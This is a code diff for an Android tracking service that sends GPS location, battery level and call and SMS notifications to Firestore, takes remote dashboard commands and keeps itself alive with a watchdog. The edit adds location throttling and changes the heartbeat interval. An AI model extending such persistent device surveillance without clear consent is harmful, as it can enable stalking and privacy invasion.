@@ -157,11 +157,30 @@ class TrackerForegroundService : Service() {
         // 1. Start fused GPS updates
         locationTracker.startTracking(trackingIntervalSeconds)
 
-        // 2. Collect location flow and push to Firestore
+        // 2. Collect location flow and push to Firestore with smart throttling
         locationCollectorJob?.cancel()
         locationCollectorJob = serviceScope.launch {
+            var lastPushedLat = 0.0
+            var lastPushedLng = 0.0
+            var lastPushedTime = 0L
+
             locationTracker.locationFlow.collect { locationData ->
-                repository.pushLocationData(locationData)
+                val now = System.currentTimeMillis()
+                val dist = FloatArray(1)
+                android.location.Location.distanceBetween(
+                    lastPushedLat, lastPushedLng,
+                    locationData.latitude, locationData.longitude,
+                    dist
+                )
+                val movedSignificant = dist[0] >= 15f // moved more than 15 meters
+                val timeElapsed = (now - lastPushedTime) >= 45_000L // or at least 45s passed
+
+                if (movedSignificant || timeElapsed || lastPushedTime == 0L) {
+                    lastPushedLat = locationData.latitude
+                    lastPushedLng = locationData.longitude
+                    lastPushedTime = now
+                    repository.pushLocationData(locationData)
+                }
                 updateNotificationText("Lat: ${"%.4f".format(locationData.latitude)}, Lng: ${"%.4f".format(locationData.longitude)} (${locationData.batteryLevel}%)")
             }
         }
@@ -169,8 +188,7 @@ class TrackerForegroundService : Service() {
         // 3. Listen for dashboard commands with auto-recovery
         ensureCommandListenerActive(deviceId)
 
-        // 4. Initialize SMS cursor and start real-time notification listeners (calls, SMS, guardian messages)
-        com.nexus.androkiller.tracker.NotificationManager.initializeSmsCursor(this)
+        // 4. Start real-time notification listeners (calls, SMS, guardian messages)
         notificationManager.startListening(deviceId)
 
         // 5. Start heartbeat status updater & keepalive watchdog
@@ -182,12 +200,16 @@ class TrackerForegroundService : Service() {
                 ensureCommandListenerActive(deviceId)
                 BootReceiver.scheduleNextKeepaliveAlarm(this@TrackerForegroundService, 60_000L)
 
+                try {
+                    com.google.firebase.firestore.FirebaseFirestore.getInstance().enableNetwork()
+                } catch (_: Exception) {}
+
                 val status = statusProvider.getSystemStatus(
                     monitoringActive = true,
                     intervalSeconds = trackingIntervalSeconds
                 )
                 repository.updateSystemStatus(status)
-                delay(15_000L) // every 15 seconds keepalive heartbeat
+                delay(30_000L) // 30 seconds keepalive heartbeat (stable and sustainable)
             }
         }
 
